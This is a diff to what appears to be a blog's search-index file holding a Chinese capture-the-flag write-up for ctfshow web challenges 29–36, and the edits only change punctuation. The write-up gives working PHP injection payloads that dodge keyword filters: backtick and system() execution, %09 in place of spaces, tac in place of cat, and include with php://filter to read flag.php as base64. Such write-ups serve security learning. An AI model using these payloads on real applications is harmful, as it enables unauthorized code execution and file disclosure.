@@ -707,14 +707,14 @@
   <entry>
     <title>ctfshow web入门29~36</title>
     <url>/2023/01/09/ctfshow29-36/</url>
-    <content><![CDATA[<h1 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h1><p><img src="/pic/web29.png" alt="img"><br>过滤了flag，可以用system,echo等。</p>
+    <content><![CDATA[<h1 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h1><p><img src="/pic/web29.png" alt="img"><br>过滤了flag，可以用system,echo等.</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=system(&quot;cat fla*&quot;);</span><br><span class="line">/?c=echo`cat fl*`;</span><br></pre></td></tr></table></figure>
-<h1 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h1><p><img src="/pic/web30.png" alt="img"><br>多过滤了一个system，还可以用echo。</p>
+<h1 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h1><p><img src="/pic/web30.png" alt="img"><br>多过滤了一个system，还可以用echo.</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?echo`cat fl*`;</span><br></pre></td></tr></table></figure>
 <span id="more"></span>
-<h1 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h1><p><img src="/pic/web31.png" alt="img"><br>cat和空格过滤了，可以用tac.<br>空格可以用%09绕过。</p>
+<h1 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h1><p><img src="/pic/web31.png" alt="img"><br>cat和空格过滤了，可以用tac.<br>空格可以用%09绕过.</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=echo%09`tac%09fl*`;</span><br></pre></td></tr></table></figure>
-<h1 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h1><p><img src="/pic/web32.png" alt="img"><br>过滤的东西太多了左括号都给过滤了，使用命令逃逸+文件包含<br>空格可以用%09绕过， ；可以用?&gt;绕过,因为使用?&gt;，所以后面没办法直接拼接php语句，需要使用文件包含。</p>
+<h1 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h1><p><img src="/pic/web32.png" alt="img"><br>过滤的东西太多了左括号都给过滤了，使用命令逃逸+文件包含.<br>空格可以用%09绕过， ；可以用?&gt;绕过,因为使用?&gt;，所以后面没办法直接拼接php语句，需要使用文件包含.</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=include%09$_GET[1]?&gt;&amp;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
 <p>再将得到的进行base64解码得到flag</p>
 <h1 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h1><p><img src="/pic/web33.png" alt="img"><br>和web32差不多，用同样的payload就行</p>
@@ -723,11 +723,11 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=include%09$_GET[1]?&gt;&amp;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
 <h1 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h1><p>依旧可以用同样的payload</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=include%09$_GET[1]?&gt;&amp;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
-<p>连续几道题都一样，写的真恶心。</p>
-<h1 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h1><p>这道题把1换成其他的字符就行，其他步骤一样。</p>
+<p>连续几道题都一样，写的真恶心.</p>
+<h1 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h1><p>这道题把1换成其他的字符就行，其他步骤一样.</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=include%09$_GET[a]?&gt;&amp;&amp;a=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
 
-<p>require可以代替include，PHP常用的可以不加括号的函数echo、print、isset、unset、include、require。</p>
+<p>require可以代替include，PHP常用的可以不加括号的函数echo、print、isset、unset、include、require.</p>
 ]]></content>
       <categories>
         <category>web</category>
